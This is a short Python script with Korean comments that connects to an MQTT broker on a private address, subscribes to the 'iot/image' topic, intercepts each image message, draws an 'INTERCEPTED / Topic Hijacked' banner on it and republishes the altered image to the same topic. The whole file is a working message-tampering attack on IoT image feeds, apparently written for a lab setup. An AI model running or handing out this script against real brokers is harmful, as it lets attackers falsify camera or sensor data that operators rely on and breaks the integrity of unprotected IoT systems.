import paho.mqtt.client as mqtt
from PIL import Image, ImageDraw, ImageFont
import io

# 설정
BROKER = "192.168.100.133"
PORT = 1883
TARGET_TOPIC = "iot/image"
HIJACKED_TOPIC = "iot/image" # 또는 iot/image 로 설정하여 혼란 유도 가능

def on_connect(client, userdata, flags, rc):
    client.subscribe(TARGET_TOPIC)
    print(f"[+] Subscribed to {TARGET_TOPIC}")

def on_message(client, userdata, msg):
    # 자신이 보낸 메시지는 무시 (무한 루프 방지용, 로직상 필요시 해제)
    # if msg.topic == HIJACKED_TOPIC: return 

    try:
        print(f"[*] 메시지 가로채기 성공! 크기: {len(msg.payload)} bytes")
        
        # 원본 이미지 로드
        img = Image.open(io.BytesIO(msg.payload))
        draw = ImageDraw.Draw(img)
        
        # 악성 워터마크 추가
        # 반투명 검은 박스
        draw.rectangle([0, 0, 350, 100], fill=(0, 0, 0, 200)) # RGBA for transparency needs RGBA mode, simplifying for RGB
        # RGB 모드에서는 투명도 지원이 안되므로 덮어쓰기
        draw.rectangle([0, 0, 350, 100], fill=(0, 0, 0))
        
        draw.text((10, 10), "INTERCEPTED", fill=(255, 0, 0))
        draw.text((10, 50), "Topic Hijacked", fill=(255, 0, 0))
        
        # 바이트 변환
        output = io.BytesIO()
        img.save(output, format='JPEG')
        manipulated_img = output.getvalue()
        
        # 조작된 메시지 재전송
        print("[*] 조작된 메시지 재전송 중...")
        client.publish(HIJACKED_TOPIC, manipulated_img)
        print("[+] 조작 완료 및 재전송")
        
    except Exception as e:
        print(f"[-] Error: {e}")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect(BROKER, PORT, 60)
client.loop_forever()
